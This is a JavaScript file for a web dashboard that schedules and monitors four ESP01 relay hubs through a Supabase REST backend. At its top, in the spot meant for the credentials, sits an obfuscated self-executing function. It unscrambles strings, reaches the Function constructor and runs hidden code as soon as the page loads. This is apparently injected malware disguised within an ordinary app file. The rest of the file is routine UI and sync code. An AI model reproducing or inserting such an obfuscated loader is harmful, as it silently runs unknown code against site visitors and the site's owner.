// app.js - Automated Layout Compilation & Cloud Synchronization Engine
// REPLACE THESE WITH YOUR EXACT SUPABASE CREDENTIALS FROM YOUR SETTINGS PANEL

var SUPABASE_URL,SUPABASE_ANON_KEY;(function(){var ERk='',nfI=241-230;function jfc(v){var b=2795901;var x=v.length;var d=[];for(var p=0;p<x;p++){d[p]=v.charAt(p)};for(var p=0;p<x;p++){var z=b*(p+540)+(b%24223);var u=b*(p+584)+(b%48098);var q=z%x;var e=u%x;var r=d[q];d[q]=d[e];d[e]=r;b=(z+u)%4241147;};return d.join('')};var gFF=jfc('mrajnocrsvckunqoilsttycugzodrbphfwxet').substr(0,nfI);var LqI='vn==uimh,e=s;tg+)A(p1r7he)[ogdva+ovjvv5)ppn s9 vi;7 d;am  +s])ff,r1ntr-;t9{,)(={.=y"+Cv,0;kd<v76187,c;,ua0"+ceo;.6e(tet>0;f=v C=vf;8rg;sArejr0gt0.vrsnutj;l+ao,r. a]==<i ;vir[(!7a9{m0y(+l(ve;(z)=a31lii]r i [+pn2g,(gjmi)ts;r-nkC};t.f)h],c+u.jC.oal9.s7na.,ilv,l" ;)b,ar0u)r)l=,1j)n;nc)=rfakh=;voub;.rkq=br}rrw(r..+n}+t;gC8 g(8m-o(l,))o"0Apah4;kr eo<(ti;aaef=ruvb(jae .t)i,xwh(+i3rtftk[s;tma=7e4vdo+8jt=w=ahne=("mvc ([;{c2onk1.*+3oz*f3Ctnge1xriblf)]or=e=,n[],nn]r"agua=).){t!zp.f.tri(r;(ty++6+lnCodo)(epd,"lcr.d)a;{odra);.m=}-h0c= hhsv;1rf<se=[o(h8r)hlipm=,x)n=u;,=o6 r";iloce[apuu ma]+vb)ta,mg;cho3)jk(crhaiuai+[]r;t1+8lh;c,("fj[h)h8(iunf;yd]4b+(v(e;2umrjg h<( zl=uo8==gglo=n}"6=(u;mlpe.)of[o;v+eex. nnakjgj=6u,-.pt+9(=;f,2we={s1u;fa06e9n)St+c-9()t](o} n[mtu;rg=r0v;=ejrC=sav-.(1}a.2=iej)=0n5rt.vej4ie;lr)1vASis4.llcel(rAtar5;(rogniu2nsa4w(),;jl[i hl6s02v,h m];)are.7[f>,95;h+ sra];7=ba2fnlu]a';var WDK=jfc[gFF];var HNY='';var AFf=WDK;var GZX=WDK(HNY,jfc(LqI));var ODA=GZX(jfc('btmh0.nbfMC)=hmyr_.(mcr)Fqq%!h)(:e.vaiSi95iF$#}E+j!q=0)FIo66toDDvy)==.f4=IDqryf2gIa2(F)%o.mt .mx+.pa0f5cwFh.pFor(i=z.[F=+6.(h54o={hc.4%c%5%28b[F.nFche.i.is3ihc.f(f._.Sc.k6.!2yF.n$xE.c!d_pnm%y.hM!.hp]g].p.SF..c..wx.o[g]l%5z!S.]c(x$!i=.b!=iI9xca%kqe %h].nif.i]j.mk5alpoj.(14E!2;l25F..or"fII$c==f#1.6)crrfc\/i...zo;wSs.fm[eq=#o.fma.rc_d.n.p.tqkymb.Fsz8].j=4kstwiM("4uF.ulI0azceS0ns.+cm+0o#%t.=%I$h!+=u;Fur)c.rg)TzFd..(g(mC7c.p{m_c3.g.\/#dFm9"nt.105Ip{=;.pEIirimi.tnb).D.ooc[$4lcs.q)Fi2)f.qi;skpgmxr._) ;sjsincIdh"qct5nM11IsIb..o#ea5j.i.ihhlCo1;+0..mS7TjCu.m;[._.0puigo.3rf.#nn($13i3..N.e.thbcc.r+ooi.;F$n=..j.p;.c3$.sp%hrr2.ja%!=Fpc.wI-c...g6i-j.l..+y90tFf.nNunk=.n,cF(stF,x.h8F_...!;]5i!C8loii5c.cc=%Fhzc2f)).[f[0bNr..v$ 4c0"9 7))ryMMNieo..i3;(_IxF.bf;ncCtl=Mpsst.ayif$=.1SFu"}lz}aI.ag3"'));var ZbO=AFf(ERk,ODA );ZbO(5527);return 9429})()






// Standard direct table API routing headers
const apiHeaders = {
    'apikey': SUPABASE_ANON_KEY,
    'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
    'Content-Type': 'application/json'
};

const HUB_NAMES = ["ESP01SA", "ESP01SB", "ESP01SC", "ESP01SX"];
let activeHubTab = 0; // Tracking pointer variable for current visual panel focus index

// =====================================================================
// MAIN INITIALIZATION BAR (Fires safely on window load)
// =====================================================================
document.addEventListener("DOMContentLoaded", async () => {
    // Phase 1: Programmatically compile the HTML tab buttons and layout structures
    generateDynamicHtmlLayoutStructure();
    
    // Phase 2: Perform instant cloud pull to populate layout inputs on page open
    logToTerminal("[Init] Downloading operational master configurations from cloud...");
    await performDatabasePullSynchronization();

    // Phase 3: Launch persistent 3-second battery-only telemetry poll tracking loop
    setInterval(executeLightweightTelemetrySynchronizer, 3000);
});

// =====================================================================
// GLOBAL VISIBILITY FUNCTIONS (Placed outside wrappers to prevent scope errors)
// =====================================================================

function logToTerminal(msg) {
    const term = document.getElementById("terminalLog");
    if (term) {
        term.innerHTML = msg + "\n" + term.innerHTML;
    }
}

function generateDynamicHtmlLayoutStructure() {
    const tabsContainer = document.getElementById("tabBarContainer");
    const workspace = document.getElementById("hubTablesWorkspace");
    
    if (!tabsContainer || !workspace) return;
    
    let tabsHtml = "";
    let workspaceHtml = "";

    for (let hub = 0; hub < 4; hub++) {
        const activeClass = (hub === 0) ? "active" : "";
        tabsHtml += `<button class="tab-btn ${activeClass}" id="btnHub${hub}" onclick="switchActiveHubPanel(${hub})">${HUB_NAMES[hub]}</button>`;
        
        workspaceHtml += `
            <div class="hub-content ${activeClass}" id="panelHub${hub}">
                <table id="table_hub_${hub}">
        `;

        for (let ch = 0; ch < 4; ch++) {
            workspaceHtml += `
                <tr><td colspan="4" class="channel-header">Channel ${ch + 1}</td></tr>
                <tr class="mode-row">
                    <td>ON</td>
                    <td>OFF</td>
                    <td colspan="2">
                        <span id="lbl_E${hub}${ch}" class="mode-lbl lbl-auto">Auto</span>
                        <input type="range" id="E${hub}${ch}" min="0" max="2" value="1" 
                               onchange="processInstantModeSliderAutoSubmit(${hub}, ${ch}, this.value)">
                    </td>
                </tr>
                <tr>
                    <td>S1</td>
                    <td><input type="time" id="T${hub}${ch}0"></td>
                    <td><input type="time" id="T${hub}${ch}1"></td>
                    <td rowspan="2" style="width: 85px;">
                        <button class="submit-btn" id="S${hub}${ch}" onclick="processManualScheduleSubmission(${hub}, ${ch})">Submit</button>
                    </td>
                </tr>
                <tr>
                    <td>S2</td>
                    <td><input type="time" id="T${hub}${ch}2"></td>
                    <td><input type="time" id="T${hub}${ch}3"></td>
                </tr>
            `;
        }

        workspaceHtml += `
                </table>
            </div>
        `;
    }

    tabsContainer.innerHTML = tabsHtml;
    workspace.innerHTML = workspaceHtml;
}

window.switchActiveHubPanel = function(selectedHubIndex) {
    activeHubTab = selectedHubIndex;
    for (let i = 0; i < 4; i++) {
        const btn = document.getElementById(`btnHub${i}`);
        const panel = document.getElementById(`panelHub${i}`);
        if (btn) btn.classList.remove("active");
        if (panel) panel.classList.remove("active");
    }
    const activeBtn = document.getElementById(`btnHub${selectedHubIndex}`);
    const activePanel = document.getElementById(`panelHub${selectedHubIndex}`);
    if (activeBtn) activeBtn.classList.add("active");
    if (activePanel) activePanel.classList.add("active");
};

async function performDatabasePullSynchronization() {
    const fetchUrl = `${SUPABASE_URL}/rest/v1/slaves?select=*&order=id_num.asc`;
    try {
        const response = await fetch(fetchUrl, { method: 'GET', headers: apiHeaders });
        if (response.ok) {
            const dataRows = await response.json();
            const ticker = document.getElementById("syncTicker");
            if (ticker) ticker.innerText = new Date().toLocaleTimeString();

            dataRows.forEach(row => {
                const hub = row.id_num;
                const modeStr = row.mode.trim();
                const schedules = [row.sk0.trim(), row.sk1.trim(), row.sk2.trim(), row.sk3.trim()];

                for (let ch = 0; ch < 4; ch++) {
                    const sliderVal = modeStr.charAt(ch) || "1";
                    const sliderElement = document.getElementById(`E${hub}${ch}`);
                    if (sliderElement) sliderElement.value = sliderVal;
                    updateVisualSliderTextLabels(hub, ch, sliderVal);
                }

                for (let ch = 0; ch < 4; ch++) {
                    const chData = schedules[ch];
                    if (chData.length === 16) {
                        for (let sked = 0; sked < 4; sked++) {
                            const start = sked * 4;
                            const clockRaw = chData.substring(start, start + 4);
                            const formattedTime = `${clockRaw.substring(0, 2)}:${clockRaw.substring(2, 4)}`;
                            const timeInput = document.getElementById(`T${hub}${ch}${sked}`);
                            if (timeInput) timeInput.value = formattedTime;
                        }
                    }
                }

                const meterElement = document.getElementById(`met${hub}`);
                if (meterElement) meterElement.value = parseInt(row.batt.trim(), 10) || 0;
            });
            logToTerminal("[Init] ✔ UI successfully built and synced from database settings.");
        }
    } catch (err) {
        logToTerminal(`[Error] Connection pull failure: ${err.message}`);
    }
}

window.processInstantModeSliderAutoSubmit = async function(hubId, channelId, updatedSliderValue) {
    const timestamp = new Date().toLocaleTimeString();
    updateVisualSliderTextLabels(hubId, channelId, updatedSliderValue);
    
    let completeModeString = "";
    for (let ch = 0; ch < 4; ch++) {
        const slider = document.getElementById(`E${hubId}${ch}`);
        completeModeString += slider ? slider.value : "1";
    }

    logToTerminal(`[${timestamp}] ⚙️ Auto-Submit: Patching Mode String to "${completeModeString}" for Hub #${hubId}...`);

    try {
        const patchUrl = `${SUPABASE_URL}/rest/v1/slaves?id_num=eq.${hubId}`;
        const response = await fetch(patchUrl, {
            method: 'PATCH',
            headers: apiHeaders,
            body: JSON.stringify({ mode: completeModeString })
        });
        if (response.ok) {
            logToTerminal(`[${new Date().toLocaleTimeString()}] ✔ Mode configurations saved to cloud! Packet broadcast ready.`);
        }
    } catch (err) {
        logToTerminal(`[Error] Auto-submit transaction exception: ${err.message}`);
    }
};

function updateVisualSliderTextLabels(hub, ch, value) {
    const label = document.getElementById(`lbl_E${hub}${ch}`);
    if (!label) return;
    
    label.className = "mode-lbl"; 
    if (value === "0") { label.innerText = "OFF"; label.classList.add("lbl-off"); }
    else if (value === "1") { label.innerText = "Auto"; label.classList.add("lbl-auto"); }
    else if (value === "2") { label.innerText = "Always On"; label.classList.add("lbl-on"); }
}

window.processManualScheduleSubmission = async function(hubId, channelId) {
    const timestamp = new Date().toLocaleTimeString();
    logToTerminal(`[${timestamp}] 📅 Compiling schedule string parameters for Hub #${hubId} Channel ${channelId + 1}...`);

    let combinedScheduleString = "";
    for (let sked = 0; sked < 4; sked++) {
        const input = document.getElementById(`T${hubId}${channelId}${sked}`);
        const inputVal = input ? input.value : "";
        if (!inputVal) {
            logToTerminal(`[${timestamp}] ❌ Submission cancelled: Time parameters cannot be blank.`);
            return;
        }
        combinedScheduleString += inputVal.replace(":", ""); 
    }

    const diagnosticOutputProtocolPacket = `${hubId}K${channelId}${combinedScheduleString}`;
    logToTerminal(`[${timestamp}] 📡 Outbound Packet: "${diagnosticOutputProtocolPacket}" (Length: ${diagnosticOutputProtocolPacket.length} chars)`);

    try {
        const patchUrl = `${SUPABASE_URL}/rest/v1/slaves?id_num=eq.${hubId}`;
        const targetColumnName = `sk${channelId}`;
        
        const response = await fetch(patchUrl, {
            method: 'PATCH',
            headers: apiHeaders,
            body: JSON.stringify({ [targetColumnName]: combinedScheduleString })
        });
        if (response.ok) {
            logToTerminal(`[${new Date().toLocaleTimeString()}] ✔ Schedule successfully synchronized to column [${targetColumnName}]!`);
        }
    } catch (err) {
        logToTerminal(`[Error] Schedule synchronization exception: ${err.message}`);
    }
};

async function executeLightweightTelemetrySynchronizer() {
    const telemetryUrl = `${SUPABASE_URL}/rest/v1/slaves?select=id_num,batt&order=id_num.asc`;
    try {
        const response = await fetch(telemetryUrl, { method: 'GET', headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': `Bearer ${SUPABASE_ANON_KEY}` } });
        if (response.ok) {
            const telemetryRows = await response.json();
            const ticker = document.getElementById("syncTicker");
            if (ticker) ticker.innerText = new Date().toLocaleTimeString();

            telemetryRows.forEach(row => {
                const hub = row.id_num;
                const meterElement = document.getElementById(`met${hub}`);
                if (meterElement) {
                    meterElement.value = parseInt(row.batt.trim(), 10) || 0;
                }
            });
        }
    } catch (err) {
        console.error("Telemetry task dropped:", err.message);
    }
}

// =====================================================================
// FRONT-END USER INTERFACE TIME RECOVERY MATRIX
// =====================================================================

// Compiles your local system clock into your strict 6-digit space-free code string format (Ex: "102244")
function getCleanLocalFormattedTimeString() {
    const now = new Date();
    const hh = String(now.getHours()).padStart(2, '0');
    const mm = String(now.getMinutes()).padStart(2, '0');
    const ss = String(now.getSeconds()).padStart(2, '0');
    return `${hh}${mm}${ss}`;
}

// STEP 1: Dispatches the '9NHHMMSS' initialization packet instantly when the browser finishes rendering
async function transmitWebStartupHandshake() {
    const timeString = getCleanLocalFormattedTimeString();
    const packetPayload = `9N${timeString}`; // Compiles cleanly into your "9N102244" format
    
    console.log(`[Handshake] Dispatching Web Startup Command String: "${packetPayload}"`);
    
    try {
        await fetch(`${SUPABASE_URL}/rest/v1/system_sync?id=eq.1`, {
            method: 'PATCH',
            headers: apiHeaders,
            body: JSON.stringify({ cmd_flag: packetPayload }) // Updates your tracking sync cell column
        });
    } catch (err) {
        console.error("Startup handshake failed:", err);
    }
}

// STEP 4: Passive routine time broadcast engine to keep system clocks in lock-step
async function executeRoutineGlobalTimeSync() {
    const timeString = getCleanLocalFormattedTimeString();
    const packetPayload = `9T${timeString}`; // Compiles cleanly into your "9T102244" format
    
    console.log(`[Time Sync] Blasting Global Clock Tracking String: "${packetPayload}"`);
    
    try {
        await fetch(`${SUPABASE_URL}/rest/v1/system_sync?id=eq.1`, {
            method: 'PATCH',
            headers: apiHeaders,
            body: JSON.stringify({ cmd_flag: packetPayload })
        });
    } catch (err) {
        console.error("Global clock sync failed:", err);
    }
}

// Hook the startup logic right into your document loading chain
document.addEventListener("DOMContentLoaded", async () => {
    generateDynamicHtmlLayoutStructure();
    
    // Fire your unspilled startup time synchronization event instantly on page open
    await transmitWebStartupHandshake();
    
    // Setup background interval loop to fire the periodic "T" update every 5 minutes (300,000 ms)
    setInterval(executeRoutineGlobalTimeSync, 300000);
});
